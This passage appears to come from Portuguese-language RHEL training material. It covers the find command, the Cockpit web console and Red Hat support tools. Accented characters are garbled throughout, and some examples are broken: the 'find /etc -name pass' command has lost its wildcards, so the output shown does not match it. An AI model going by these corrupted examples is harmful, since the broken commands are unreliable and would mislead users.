[root@host ~]# find / -name sshd_config /etc/ssh/sshd_config
Nota
Com o comando find, as op√ß√µes de palavras completas usam um √∫nico tra√ßo e as op√ß√µes seguem o argumento do nome do caminho, diferentemente da maioria dos outros comandos do Linux.
Caracteres curinga est√£o dispon√≠veis para pesquisa por nome de arquivo e retornar√£o todos os resultados que forem correspond√™ncias parciais. Ao usar caracteres curinga, √© importante citar o nome do arquivo a ser procurado para evitar que o terminal interprete o caractere curinga.
Neste exemplo, procure os arquivos no diret√≥rio / que terminam em .txt:
[root@host ~]# find / -name &amp;lsquo;*.txt&amp;rsquo; /etc/pki/nssdb/pkcs11.txt /etc/brltty/brl-lt-all.txt /etc/brltty/brl-mb-all.txt /etc/brltty/brl-md-all.txt /etc/brltty/brl-mn-all.txt &amp;hellip;output omitted&amp;hellip;
Para procurar arquivos no diret√≥rio /etc/ que cont√™m a palavra pass em qualquer lugar de seus nomes no host, execute o seguinte comando:
[root@host ~]# find /etc -name &amp;lsquo;pass&amp;rsquo; /etc/security/opasswd /etc/pam.d/passwd /etc/pam.d/password-auth /etc/passwd- /etc/passwd /etc/authselect/password-auth
Para realizar uma pesquisa que n√£o diferencie min√∫sculas e mai√∫sculas de um determinado nome de arquivo, use a op√ß√£o -iname, seguida pelo nome de arquivo que deseja pesquisar. Para pesquisar arquivos com o texto messages, sem diferenciar mai√∫sculas de min√∫sculas, em seus nomes no diret√≥rio / do host, execute o seguinte comando:
[root@host ~]# find / -iname &amp;lsquo;messages&amp;rsquo; &amp;hellip;output omitted&amp;hellip; /usr/share/vim/vim80/lang/zh_CN.UTF-8/LC_MESSAGES /usr/share/vim/vim80/lang/zh_CN.cp936/LC_MESSAGES /usr/share/vim/vim80/lang/zh_TW/LC_MESSAGES /usr/share/vim/vim80/lang/zh_TW.UTF-8/LC_MESSAGES /usr/share/vim/vim80/syntax/messages.vim /usr/share/vim/vim80/syntax/msmessages.vim
Pesquisa de arquivos com base na propriedade ou permiss√£o
O comando find pode procurar arquivos com base na propriedade ou nas permiss√µes. Op√ß√µes √∫teis em uma pesquisa pelo propriet√°rio s√£o -user e -group (que pesquisam por nome) e -uid e -gid (que pesquisam por ID).
Procure arquivos cujo propriet√°rio seja user no diret√≥rio /home/user do host.
[user@host ~]$ find -user user . ./.bash_logout ./.bash_profile ./.bashrc ./.bash_history
Procure arquivos cujo propriet√°rio seja o grupo user no diret√≥rio /home/user do host.
[user@host ~]$ find -group user . ./.bash_logout ./.bash_profile ./.bashrc ./.bash_history
Procure arquivos cujo propriet√°rio seja a ID de usu√°rio 1000 no diret√≥rio /home/user do host.
[user@host ~]$ find -uid 1000 . ./.bash_logout ./.bash_profile ./.bashrc ./.bash_history
Procure arquivos cujo propriet√°rio seja a ID de grupo 1000 no diret√≥rio /home/user do host.
[user@host ~]$ find -gid 1000 . ./.bash_logout ./.bash_profile ./.bashrc ./.bash_history
As op√ß√µes -user e -group podem ser usadas juntas para procurar arquivos em que o propriet√°rio do arquivo e o propriet√°rio do grupo sejam diferentes. O exemplo abaixo lista os arquivos de propriedade do usu√°rio root e afiliados ao grupo mail.
[root@host ~]# find / -user root -group mail /var/spool/mail &amp;hellip;output omitted&amp;hellip;
A op√ß√£o -perm √© usada para procurar arquivos com um conjunto espec√≠fico de permiss√µes. As permiss√µes podem ser descritas como valores octais, com algumas combina√ß√µes de 4, 2 e 1 referentes a leitura, grava√ß√£o e execu√ß√£o. As permiss√µes podem ser precedidas por uma / ou sinal de -.
Uma permiss√£o num√©rica precedida de / corresponde a arquivos que t√™m pelo menos um bit de usu√°rio, de grupo ou de outro para o conjunto de permiss√µes. Um arquivo com permiss√µes r&amp;ndash;r&amp;ndash;r&amp;ndash; n√£o corresponde a /222, mas um com rw-r&amp;ndash;r&amp;ndash; corresponde. Um sinal de - antes de uma permiss√£o significa que as tr√™s inst√¢ncias desse bit devem estar habilitadas, de modo que nenhum dos exemplos anteriores seria correspondente, mas um comando como rw-rw-rw-&amp;gt; corresponderia.
Para usar um exemplo mais complexo, o seguinte comando corresponde a qualquer arquivo para o qual o usu√°rio tenha permiss√µes de leitura, grava√ß√£o e execu√ß√£o, os membros do grupo tenham permiss√µes de leitura e grava√ß√£o e outros tenham acesso somente leitura:
[root@host ~]# find /home -perm 764
Para corresponder arquivos aos quais o usu√°rio tem pelo menos permiss√µes de grava√ß√£o e execu√ß√£o e o grupo tem pelo menos permiss√µes de grava√ß√£o e outros t√™m pelo menos acesso de leitura:
[root@host ~]# find /home -perm -324
Para corresponder arquivos aos quais o usu√°rio tem permiss√µes de leitura ou o grupo tem pelo menos permiss√µes de leitura ou outros t√™m pelo menos acesso de grava√ß√£o:
[root@host ~]# find /home -perm /442
Quando usado com / ou -, um valor de 0 funciona como um caractere curinga, pois significa uma permiss√£o de pelo menos nada.
Para encontrar qualquer arquivo no diret√≥rio /home/user ao qual outros usu√°rios t√™m pelo menos o acesso de leitura no host, execute:
[user@host ~]$ find -perm -004
Localize todos os arquivos no diret√≥rio /home/user onde outros t√™m permiss√µes de grava√ß√£o no host.
[user@host ~]$ find -perm -002
Pesquisa de arquivos com base no tamanho
O comando find pode procurar arquivos que correspondem a um tamanho especificado com a op√ß√£o -size seguida de um valor num√©rico e da unidade. Use a seguinte lista de unidades com a op√ß√£o -size:
k, para kilobyte M, para megabyte G, para gigabyte O exemplo abaixo mostra como procurar arquivos com 10 megabytes de tamanho, arredondados.
[user@host ~]$ find -size 10M
Para encontrar os arquivos com tamanho superior a 10 gigabytes.
[user@host ~]$ find -size &#43;10G
Para listar todos os arquivos com um tamanho inferior a 10 quilobytes.
[user@host ~]$ find -size -10k
Importante
Os modificadores de unidade da op√ß√£o -size arredondam os valores para unidades √∫nicas. Por exemplo, o comando find -size 1M mostra os arquivos com menos de 1 MB porque arredonda todos os arquivos de at√© 1 MB.
Pesquisa de arquivos com base no hor√°rio de modifica√ß√£o
A op√ß√£o -mmin, seguida pelo tempo em minutos, procura todos os arquivos com conte√∫do alterado h√° n minutos. O carimbo de data e hora do arquivo √© sempre arredondado para baixo. Ele tamb√©m d√° suporte a valores fracion√°rios quando usados com intervalos (&#43;n e -n).
Para localizar todos os arquivos que tiveram o conte√∫do modificado h√° 120 minutos no host, execute:
[root@host ~]# find / -mmin 120
O modificador &#43; que antecede a quantidade de minutos procura todos os arquivos no diret√≥rio / modificados h√° mais de n minutos. Neste exemplo, os arquivos modificados h√° mais de 200 minutos est√£o listados.
[root@host ~]# find / -mmin &#43;200
O modificador - altera a pesquisa para procurar todos os arquivos no diret√≥rio / alterados h√° menos de n minutos. Neste exemplo, os arquivos modificados h√° menos de 150 minutos est√£o listados.
[root@host ~]# find / -mmin -150
Pesquisa de arquivos com base no tipo de arquivo
A op√ß√£o -type no comando find limita o escopo da pesquisa para um determinado tipo de arquivo. Use a seguinte lista para passar os sinalizadores obrigat√≥rios a fim de limitar o escopo da pesquisa:
f, para arquivo normal d, para diret√≥rio l, para softlink b, para dispositivo de blocos Pesquise todos os diret√≥rios no diret√≥rio /etc do host.
[root@host ~]# find /etc -type d /etc /etc/tmpfiles.d /etc/systemd /etc/systemd/system /etc/systemd/system/getty.target.wants &amp;hellip;output omitted&amp;hellip;
Pesquise todos os softlinks no host.
[root@host ~]# find / -type l
Gere a lista de todos os dispositivos de blocos no diret√≥rio /dev do host:
[root@host ~]# find /dev -type b /dev/vda1 /dev/vda
A op√ß√£o -links antes de um n√∫mero procura todos os arquivos com uma determinada contagem de hardlinks. O n√∫mero pode ser precedido por um modificador &#43; para procurar arquivos com um n√∫mero superior ao da contagem de hardlinks fornecida. Se o n√∫mero for precedido por um modificador -, a pesquisa ser√° limitada a todos os arquivos com uma contagem de hardlinks inferior ao n√∫mero fornecido.
Pesquise todos os arquivos regulares com mais de um hardlink no host:
[root@host ~]# find / -type f -links &#43;1
Cap√≠tulo 16. An√°lise e obten√ß√£o de suporte An√°lise e gerenciamento de servidores remotos Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de ativar a interface de gerenciamento do console da web para gerenciar e monitorar remotamente o desempenho de um servidor Red Hat Enterprise Linux. Descri√ß√£o do console da web
O console da web √© uma interface de gerenciamento baseada na web para o Red Hat Enterprise Linux 8 projetada para gerenciar e monitorar seus servidores. Ele √© baseado no servi√ßo open source Cockpit.
Voc√™ pode usar o console da web para monitorar logs do sistema e visualizar gr√°ficos de desempenho do sistema. Al√©m disso, voc√™ pode usar o seu navegador para alterar as configura√ß√µes usando ferramentas gr√°ficas na interface do console da web, incluindo uma sess√£o de terminal interativa totalmente funcional. Ativa√ß√£o do console da web
O Red Hat Enterprise Linux 8 instala o console da web por padr√£o em todas as variantes de instala√ß√£o, exceto uma instala√ß√£o m√≠nima. Use o seguinte comando para instalar o console da web:
[user@host ~]$ sudo yum install cockpit
Ative e inicie o servi√ßo cockpit.socket, que executa um servidor web. Essa etapa √© necess√°ria se voc√™ precisar se conectar ao sistema por meio da interface web.
[user@host ~]$ sudo systemctl enable &amp;ndash;now cockpit.socket Created symlink /etc/systemd/system/sockets.target.wants/cockpit.socket -&amp;gt; /usr/lib/systemd/system/cockpit.socket.
Se voc√™ estiver usando um perfil de firewall personalizado, precisar√° do servi√ßo cockpit para firewalld para abrir a porta 9090 no firewall:
[user@host ~]$ sudo firewall-cmd &amp;ndash;add-service=cockpit &amp;ndash;permanent success [user@host ~]$ sudo firewall-cmd &amp;ndash;reload success
Login no console da web
O console da web fornece seu pr√≥prio servidor web. Inicie o Firefox para fazer login no console da web. Voc√™ pode fazer login com o nome de usu√°rio e a senha de qualquer conta local no sistema, incluindo o usu√°rio root.
Abra https://servername:9090 no seu navegador da web, onde servername √© o nome do host ou endere√ßo IP do seu servidor. A conex√£o ser√° protegida por uma sess√£o TLS. O sistema √© instalado com um certificado TLS autoassinado por padr√£o e, quando voc√™ se conecta inicialmente, seu navegador da web provavelmente exibe um aviso de seguran√ßa. A p√°gina do man cockpit-ws(8) fornece instru√ß√µes sobre como substituir o certificado TLS por um que esteja devidamente assinado.
Digite o nome de usu√°rio e a senha na tela de login.
cockpit-login.png
Como op√ß√£o, clique em Reuse my password for privileged tasks. Isso permite que voc√™ execute comandos com privil√©gios sudo, permitindo executar tarefas como modificar informa√ß√µes do sistema ou configurar novas contas.
Clique em Log In.
O console da web exibe o nome do usu√°rio no lado direito da barra de t√≠tulo. Se voc√™ escolher a op√ß√£o Reuse my password for privileged tasks, o √≠cone Privileged √© exibido √† esquerda do nome do usu√°rio.
cockpit-title-bar-privileged.png
Se voc√™ estiver conectado como um usu√°rio sem privil√©gios, o √≠cone Privileged n√£o ser√° exibido.
cockpit-title-bar-nonprivileged.png
Altera√ß√£o de senhas
Usu√°rios com e sem privil√©gios podem alterar suas pr√≥prias senhas enquanto estiverem conectados ao console da web. Clique em Accounts na barra de navega√ß√£o. Clique no r√≥tulo da sua conta para abrir a p√°gina de detalhes da conta.
accounts-student-main.png
Como um usu√°rio sem privil√©gios, voc√™ est√° restrito a definir ou redefinir sua senha e gerenciar chaves SSH p√∫blicas. Para definir ou redefinir sua senha, clique em Set Password.
accounts-student-details.png
Digite suas informa√ß√µes nos campos Old Password, New Password e Confirm New Password. Clique em Set para ativar a nova senha.
accounts-student-set-new-password.png
Solu√ß√£o de problemas com o console da web
O console da web √© uma poderosa ferramenta de solu√ß√£o de problemas. Voc√™ pode monitorar as estat√≠sticas b√°sicas do sistema em tempo real, inspecionar os logs do sistema e alternar rapidamente para uma sess√£o de terminal no console da web para coletar informa√ß√µes adicionais da interface de linha de comando.
Monitoramento das estat√≠sticas do sistema em tempo real
Clique em Overview na barra de navega√ß√£o para visualizar informa√ß√µes sobre o sistema, como seu tipo de hardware, sistema operacional, nome do host e mais. Se voc√™ estiver conectado como usu√°rio sem privil√©gios, ver√° todas as informa√ß√µes, mas n√£o ter√° permiss√£o para modificar valores. A imagem a seguir exibe parte da p√°gina Overview.
nonprivileged-system-menu-top.png
Clique em View graphs p√°gina Overview para ver gr√°ficos do desempenho atual do sistema para atividade da CPU, uso de mem√≥ria, E/S do disco e uso da rede.
nonprivileged-system-menu-bottom.png
Inspe√ß√£o e filtros de eventos do syslog
Na barra de navega√ß√£o, Logs fornece acesso a ferramentas de an√°lise para os logs do sistema. Voc√™ pode usar os menus na p√°gina para filtrar mensagens de log com base em um intervalo de datas de registro, n√≠vel de gravidade ou ambos. O console da web usa a data atual como o padr√£o, mas voc√™ pode clicar no menu de datas e especificar um intervalo de datas. Da mesma forma, o menu Severity fornece op√ß√µes que v√£o de Everything a condi√ß√µes de gravidade mais espec√≠ficas, como Alert and above, Debug and above, e assim por diante.
nonprivileged-logs-main-filters.png
Clique em uma linha para visualizar detalhes do relat√≥rio de log. No exemplo abaixo, observe a primeira linha, que relata em uma mensagem de log sudo.
nonprivileged-logs-eanda.png
O exemplo abaixo mostra os detalhes exibidos ao clicar na linha sudo. Os detalhes do relat√≥rio incluem a entrada de log selecionada (sudo), a data, a hora, a prioridade, o recurso de syslog da entrada de log, o nome do host do sistema que relatou a mensagem de log e mais.
nonprivileged-logs-entry.png
Execu√ß√£o de comandos em uma sess√£o de terminal
Na barra de navega√ß√£o, Terminal fornece acesso a uma sess√£o de terminal totalmente funcional na interface do console da web. Isso permite que voc√™ execute comandos arbitr√°rios para gerenciar e trabalhar com o sistema e executar tarefas n√£o suportadas por outras ferramentas fornecidas pelo console da web.
A imagem a seguir exibe exemplos de comandos comuns usados para coletar informa√ß√µes adicionais. A listagem do conte√∫do do diret√≥rio /var/log fornece lembretes sobre os arquivos de log que possam ter informa√ß√µes valiosas. O comando id fornece informa√ß√µes r√°pidas, como associa√ß√£o de grupo, que podem ajudar a solucionar problemas de restri√ß√µes de acesso a arquivos. O comando ps au fornece uma vis√£o r√°pida dos processos em execu√ß√£o no terminal e o usu√°rio associado ao processo.
nonprivileged-terminal.png
Cria√ß√£o de relat√≥rios de diagn√≥stico
Um relat√≥rio de diagn√≥stico √© uma cole√ß√£o de detalhes de configura√ß√£o, informa√ß√µes do sistema e informa√ß√µes de diagn√≥stico de um sistema Red Hat Enterprise Linux. Os dados coletados no relat√≥rio conclu√≠do incluem logs do sistema e informa√ß√µes para depura√ß√£o que podem ser usadas para solucionar problemas.
Fa√ßa login no console da web como usu√°rio com privil√©gios. Clique em Diagnostic Reports na barra de navega√ß√£o para abrir a p√°gina que cria esses relat√≥rios. Clique em Create Report para gerar um novo relat√≥rio de diagn√≥stico.
diagnostic-reports-main-page.png
A interface exibe Done! quando o relat√≥rio estiver conclu√≠do. Clique em Download report para salvar o relat√≥rio.
diagnostic-report-download.png
Clique em Save File para salvar o arquivo e concluir o processo.
diagnostic-reports-save-file.png
O relat√≥rio conclu√≠do est√° salvo no diret√≥rio Downloads no sistema que hospeda o navegador da web usado para acessar o console da web. Neste exemplo, o host √© workstation.
diagnostic-reports-workstation-sosreport.png
Gerenciamento de servi√ßos do sistema com o console da web
Como usu√°rio com privil√©gios no console da web, voc√™ pode interromper, iniciar, ativar e reiniciar os servi√ßos do sistema. Al√©m disso, voc√™ pode configurar as interfaces de rede, configurar servi√ßos de firewall, administrar contas de usu√°rio e muito mais. As imagens a seguir exibem exemplos comuns de uso das ferramentas de gerenciamento do console da web.
Op√ß√µes de energia do sistema
O console da web permite reiniciar ou desligar o sistema. Fa√ßa login no console da web como usu√°rio com privil√©gios. Clique em Overview na barra de navega√ß√£o para acessar as op√ß√µes de energia do sistema.
Selecione a op√ß√£o desejada no menu suspenso no canto superior direito para reiniciar ou desligar um sistema.
system-power-options.png
Controle de servi√ßos do sistema em execu√ß√£o
Voc√™ pode iniciar, ativar, desativar e interromper servi√ßos com ferramentas gr√°ficas no console da web. Clique em Services na barra de navega√ß√£o para acessar a p√°gina inicial de servi√ßos do console da web. Para gerenciar servi√ßos, clique em System Services na parte superior da p√°gina inicial de servi√ßos. Pesquise na barra de pesquisa ou percorra a p√°gina para selecionar o servi√ßo que deseja gerenciar.
No exemplo abaixo, selecione a linha chronyd.service para abrir a p√°gina de gerenciamento de servi√ßos.
services-main.png
Clique em Stop, Restart ou Disallow running (mask) como adequado para gerenciar o servi√ßo. Neste modo de exibi√ß√£o, o servi√ßo j√° est√° em execu√ß√£o. Informa√ß√µes adicionais relacionadas ao servi√ßo est√£o dispon√≠veis clicando em qualquer um dos links destacados ou percorrendo os logs de servi√ßo exibidos abaixo da se√ß√£o de gerenciamento de servi√ßos.
services-chronyd.png
Configura√ß√£o de interfaces de rede e firewall
Para gerenciar regras de firewall e interfaces de rede, clique em Networking na barra de navega√ß√£o. O exemplo a seguir mostra como coletar informa√ß√µes sobre interfaces de rede e como gerenci√°-las.
networking-main-view.png
Clique no nome da interface desejada na se√ß√£o Interfaces para acessar a p√°gina de gerenciamento. Neste exemplo, a interface eth0 est√° selecionada.
networking-interfaces-section.png
A parte superior da p√°gina de gerenciamento exibe a atividade do tr√°fego de rede para o dispositivo selecionado. Role para baixo para visualizar as configura√ß√µes e as op√ß√µes de gerenciamento.
networking-ens3-details.png
Para modificar ou adicionar op√ß√µes de configura√ß√£o a uma interface, clique nos links destacados para a configura√ß√£o desejada. Neste exemplo, o link IPv4 mostra um √∫nico endere√ßo IP e m√°scara de rede, 172.25.250.10/24, para a interface de rede eth0. Para adicionar um endere√ßo IP adicional √† interface de rede eth0, clique no link destacado.
networking-ens3-configure-section.png
Clique em &#43; no lado direito da sele√ß√£o de lista Manual para inserir um endere√ßo IP adicional. Digite um endere√ßo IP e uma m√°scara de rede nos campos apropriados. Clique em Apply para ativar as novas configura√ß√µes.
networking-ipv4-add-new-ip.png
A exibi√ß√£o retorna automaticamente para a p√°gina de gerenciamento da interface, na qual voc√™ pode confirmar o novo endere√ßo IP.
networking-ipv4-confirm-new-ip.png
Administra√ß√£o de contas de usu√°rio
Como usu√°rio com privil√©gios, voc√™ pode criar novas contas de usu√°rio no console da web. Clique em Accounts na barra de navega√ß√£o para visualizar as contas existentes. Clique em Create New Account para abrir a p√°gina de gerenciamento de contas.
accounts-main-view.png
Insira as informa√ß√µes da nova conta e clique em Create.
accounts-create-new-user.png
A exibi√ß√£o retorna automaticamente para a p√°gina de gerenciamento da conta, na qual voc√™ pode confirmar a nova conta de usu√°rio.
accounts-verify-new-user.png
Obter ajuda do Red Hat Customer Portal Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de descrever os principais recursos dispon√≠veis por meio do Red Hat Customer Portal e us√°-los para encontrar informa√ß√µes da documenta√ß√£o da Red Hat e da base de conhecimento. Acesso aos recursos de suporte no Red Hat Customer Portal
O Red Hat Customer Portal (https://access.redhat.com) fornece aos clientes acesso a documenta√ß√£o, downloads, ferramentas e conhecimento t√©cnico. Os clientes podem buscar solu√ß√µes, perguntas frequentes e artigos na base de conhecimento. No Customer Portal, voc√™ pode:
Acessar a documenta√ß√£o oficial do produto. Enviar e gerenciar t√≠quetes de suporte. Gerenciar subscri√ß√µes e direitos de software. Obter downloads de software, atualiza√ß√µes e avalia√ß√µes. Consultar ferramentas que podem ajudar a otimizar a configura√ß√£o dos seus sistemas. Partes do site est√£o acess√≠veis a todos, enquanto outras s√£o exclusivas para clientes com subscri√ß√£o ativa. Obtenha ajuda para acessar o Customer Portal em https://access.redhat.com/help/. Orienta√ß√µes sobre o Customer Portal
Os clientes podem acessar o Red Hat Customer Portal por meio de um navegador. Esta se√ß√£o apresenta o tour do Customer Portal. O tour pode ser encontrado em https://access.redhat.com/start.
O tour √© uma ferramenta muito √∫til para descobrir tudo o que o portal tem a oferecer e como aproveitar ao m√°ximo sua subscri√ß√£o da Red Hat. Depois de fazer login no Red Hat Customer Portal, clique em Tour the Customer Portal.
tour-portal.png
A janela WELCOME TO THE RED HAT CUSTOMER PORTAL √© exibida com duas op√ß√µes: CLOSE e NEXT. Clique em NEXT para come√ßar o tour. Esta √© a primeira de uma sequ√™ncia de janelas que destacam diferentes partes da interface.
A barra de navega√ß√£o superior
As tr√™s primeiras paradas no Tour do Customer Portal podem ser encontradas na barra de navega√ß√£o superior do site do Red Hat Customer Portal:
top-bar.png
Subscriptions abre uma nova p√°gina na qual voc√™ pode gerenciar seus sistemas registrados e seu uso de subscri√ß√µes e direitos. Ela lista informa√ß√µes sobre erratas aplic√°veis e permite que voc√™ crie chaves de ativa√ß√£o que poder√° usar ao registrar sistemas para garantir que eles obtenham direitos das subscri√ß√µes corretas. Observe que, se voc√™ fizer parte de uma organiza√ß√£o, o administrador da sua organiza√ß√£o poder√° limitar seu acesso a essa p√°gina.
Downloads abre uma nova p√°gina que fornece acesso aos downloads do produto e solicita direitos de avalia√ß√£o para produtos para os quais voc√™ n√£o possui direitos.
Support Cases abre uma nova p√°gina que fornece acesso para criar, rastrear e gerenciar seus casos de suporte por meio do sistema de gerenciamento de casos, pressupondo que sua organiza√ß√£o tenha autorizado esse n√≠vel de acesso.
Seu nome √© o t√≠tulo para o User Menu, que permite gerenciar sua conta, contas nas quais voc√™ √© administrador da organiza√ß√£o, seu perfil pessoal e op√ß√µes para notifica√ß√µes de e-mail sobre novos conte√∫dos dispon√≠veis.
O √≠cone de globo abre o menu Select Your Language para especificar suas prefer√™ncias de idioma para o Customer Portal.
Menus de t√≥picos
Abaixo da barra de navega√ß√£o superior, na p√°gina principal do Customer Portal, est√£o os menus que voc√™ pode usar para navegar em quatro categorias principais de recursos dispon√≠veis no site.
banner.png
Products &amp;amp; Services fornece acesso aos hubs de produtos, p√°ginas que fornecem acesso a avalia√ß√µes espec√≠ficas de produtos, vis√µes gerais, guias de introdu√ß√£o e outras informa√ß√µes de suporte ao produto. Voc√™ tamb√©m pode acessar a documenta√ß√£o dos produtos da Red Hat, links diretos para a base de conhecimento de artigos de suporte e informa√ß√µes sobre pol√≠ticas de suporte, al√©m de como entrar em contato com o suporte da Red Hat.
products-services.png
O menu Tools fornece links para ferramentas que ajudam voc√™ a obter sucesso com os produtos da Red Hat. A se√ß√£o Solution Engine oferece uma maneira eficiente de procurar solu√ß√µes para seus problemas rapidamente e por produto, al√©m de abrir um t√≠quete de suporte caso voc√™ n√£o encontre uma solu√ß√£o satisfat√≥ria. A se√ß√£o Customer Portal Labs fornece uma cole√ß√£o de aplicativos baseados na web e ferramentas para ajudar voc√™ a melhorar o desempenho, diagnosticar problemas, identificar problemas de seguran√ßa e otimizar suas configura√ß√µes. Por exemplo, o Product Life Cycle Checker permite que voc√™ selecione um produto espec√≠fico e visualize seu cronograma de ciclo de vida de suporte. Outra ferramenta, o Rescue Mode Assistant, ajuda a redefinir a senha root de um sistema, gerar relat√≥rios de diagn√≥stico ou corrigir problemas no momento do boot com sistemas de arquivos. Mas h√° muitas outras ferramentas dispon√≠veis nesse site.
tools.png
A se√ß√£o Security fornece acesso ao Red Hat Product Security Center em https://access.redhat.com/security/. Essa se√ß√£o tamb√©m fornece informa√ß√µes sobre quest√µes de seguran√ßa de alto n√≠vel, acesso ao Red Hat CVE Database, o canal de seguran√ßa do Blog da Red Hat e recursos sobre o processo de resposta de seguran√ßa da Red Hat e como avaliamos os problemas e os resolvemos.
Por fim, a se√ß√£o Community √© um lugar onde especialistas, clientes e parceiros da Red Hat podem se comunicar e colaborar. Aqui, s√£o disponibilizados f√≥runs de discuss√£o, blogs e informa√ß√µes sobre os pr√≥ximos eventos em sua √°rea. Nota
Voc√™ deve concluir todo o tour em Introdu√ß√£o √† Red Hat, incluindo as se√ß√µes sobre como personalizar sua experi√™ncia do Customer Portal e explorar os benef√≠cios da sua subscri√ß√£o da Red Hat, a fim de conhecer toda a hist√≥ria do Customer Portal. Voc√™ precisar√° de pelo menos uma subscri√ß√£o ativa na sua conta do Customer Portal para acessar essa p√°gina. Pesquisa na base de conhecimento com a ferramenta de suporte da Red Hat
O utilit√°rio da ferramenta de suporte da Red Hat, redhat-support-tool, fornece uma interface baseada em texto que permite pesquisar artigos da base de conhecimento e casos de suporte a arquivos no Customer Portal a partir da linha de comando do seu sistema. A ferramenta n√£o tem interface gr√°fica e, como interage com o Red Hat Customer Portal, exige acesso √† Internet. Execute o comando redhat-support-tool usando qualquer terminal ou conex√£o SSH.
O comando redhat-support-tool pode ser usado em um modo interativo ou invocado como um comando com op√ß√µes e argumentos. A sintaxe da ferramenta √© id√™ntica para ambos os m√©todos. Por padr√£o, o programa √© executado em modo interativo. Use o subcomando help para ver todos os comandos dispon√≠veis. O modo interativo oferece suporte ao preenchimento com Tab e √† capacidade de chamar programas no shell pai.
[user@host ~]$ redhat-support-tool Welcome to the Red Hat Support Tool. Command (? for help):
Quando invocado pela primeira vez, o redhat-support-tool pede informa√ß√µes de login do assinante do Red Hat Customer Portal. Para evitar fornecer essas informa√ß√µes repetidamente, a ferramenta pede para armazenar as informa√ß√µes da conta no diret√≥rio pessoal do usu√°rio (~/.redhat-support-tool/redhat-support-tool.conf). Se todos os problemas forem arquivados em uma determinada conta do Red Hat Customer Portal, a op√ß√£o &amp;ndash;global pode salvar informa√ß√µes da conta em /etc/redhat-support-tool.conf, junto com outras configura√ß√µes em todo o sistema. O comando config da ferramenta modifica as defini√ß√µes de configura√ß√£o da ferramenta.
O comando redhat-support-tool permite que os assinantes pesquisem e exibam o mesmo conte√∫do da base de conhecimento do Red Hat Customer Portal. A base de conhecimento permite pesquisas por palavra-chave, de maneira semelhante √† do comando man. Voc√™ pode digitar c√≥digos de erro, sintaxe de arquivos de registro ou qualquer combina√ß√£o de palavras-chave para produzir uma lista de documentos de solu√ß√µes relevantes.
A seguir, vemos uma configura√ß√£o inicial e uma demonstra√ß√£o de pesquisa b√°sica:
[user@host ~]$ redhat-support-tool Welcome to the Red Hat Support Tool. Command (? for help): search How to manage system entitlements with subscription-manager Please enter your RHN user ID: subscriber Save the user ID in /home/student/.redhat-support-tool/redhat-support-tool.conf (y/n): y Please enter the password for subscriber: password Save the password for subscriber in /home/student/.redhat-support-tool/redhat-support-tool.conf (y/n): y
Depois de solicitar ao usu√°rio a configura√ß√£o de usu√°rio necess√°ria, a ferramenta continua com a solicita√ß√£o de pesquisa original:
Type the number of the solution to view or &amp;rsquo;e&amp;rsquo; to return to the previous menu. 1 [ 253273:VER] How to register and subscribe a system to the Red Hat Customer Portal using Red Hat Subscription-Manager 2 [ 265523:VER] Enabling or disabling a repository using Red Hat Subscription Management 3 [ 100423:VER] Why does subscription-manager list return: &amp;ldquo;No Installed Products found&amp;rdquo; ? &amp;hellip;output omitted&amp;hellip; Select a Solution: 1
Selecione o artigo n√∫mero 1 conforme acima e ser√° solicitado que voc√™ selecione a se√ß√£o do documento a ser lido. Por fim, use a tecla Q para sair da se√ß√£o em que est√° ou use-a repetidamente para sair do comando redhat-support-tool.
Select a Solution: 1
Type the number of the section to view or &amp;rsquo;e&amp;rsquo; to return to the previous menu. 1 Title 2 Issue 3 Environment 4 Resolution 5 Display all sections End of options. Section: 1
Title How to register and subscribe a system to the Red Hat Customer Portal using Red Hat Subscription-Manager URL: https://access.redhat.com/solutions/253273 Created On: None Modified On: 2017-11-29T15:33:51Z
(END) q Section: Section: q
Select a Solution: q
Command (? for help): q [user@hosts ~]#
Acesso aos artigos da base de conhecimento pela ID do documento
Localize artigos on-line diretamente usando o comando kb da ferramenta com a ID de documento da base de conhecimento. Um documento retornado rola na tela sem pagina√ß√£o, mas voc√™ pode redirecion√°-lo para um arquivo a fim de salv√°-lo e usar less para percorrer uma tela por vez.
[user@host ~]$ redhat-support-tool kb 253273
Title How to register and subscribe a system to the Red Hat Customer Portal using Red Hat Subscription-Manager URL: https://access.redhat.com/solutions/253273 Created On: None Modified On: 2017-11-29T15:33:51Z
Issue How to register a new Red Hat Enterprise Linux system to the Customer Portal using Red Hat Subscription-Manager &amp;hellip;output omitted&amp;hellip; Gerenciamento de casos de suporte com a ferramenta Red Hat Support
Uma das vantagens de uma subscri√ß√£o de produto √© o acesso ao suporte t√©cnico por meio do Red Hat Customer Portal. Dependendo do n√≠vel de suporte da subscri√ß√£o do sistema, a Red Hat poder√° ser contatada por meio de ferramentas on-line ou por telefone. Consulte https://access.redhat.com/site/support/policy/support_process para obter informa√ß√µes detalhadas.
Prepara√ß√£o de um relat√≥rio de erros
Antes de entrar em contato com o Suporte da Red Hat Support, √© importante reunir as informa√ß√µes relevantes para seu relat√≥rio de erros.
Defina o problema. Esteja pronto a declarar claramente o problema e seus sintomas. Seja o mais espec√≠fico poss√≠vel. Detalhe as etapas que reproduzir√£o o problema.
Re√∫na informa√ß√µes de contexto. Qual produto e vers√£o s√£o afetados? Esteja preparado para fornecer as informa√ß√µes de diagn√≥stico relevantes. Isso pode incluir a sa√≠da de sosreport, que ser√° discutida posteriormente nesta se√ß√£o. Para problemas de kernel, poder√£o ser inclu√≠das informa√ß√µes do despejo de mem√≥ria kdump do sistema ou uma imagem digital do backtrace do kernel exibida no monitor de um sistema com falha.
Determine o n√≠vel de gravidade. A Red Hat usa quatro n√≠veis de gravidade para classificar problemas. Os relat√≥rios de problemas de gravidade Urgente e Alta devem ser seguidos por uma liga√ß√£o telef√¥nica para a central de suporte local relevante (consulte https://access.redhat.com/site/support/contact/technicalSupport).
redhat_plan1.png
Gerenciamento de um relat√≥rio de bugs com redhat-support-tool
Voc√™ pode criar, exibir, modificar e fechar Casos de suporte da Red Hat usando o redhat-support-tool. Quando casos de suporte est√£o com o status opened ou maintained, os usu√°rios podem anexar arquivos ou documenta√ß√£o, tais como relat√≥rios de diagn√≥stico (sosreport). A ferramenta envia e anexa arquivos para casos.
Os detalhes do caso, incluindo o nome, a vers√£o, o sum√°rio, a descri√ß√£o, a gravidade e o grupo do caso do produto podem ser atribu√≠dos com as op√ß√µes de comando ou aguardando que a ferramenta solicite as informa√ß√µes necess√°rias. No exemplo a seguir, um novo caso √© aberto. As op√ß√µes &amp;ndash;product e &amp;ndash;version s√£o especificadas.
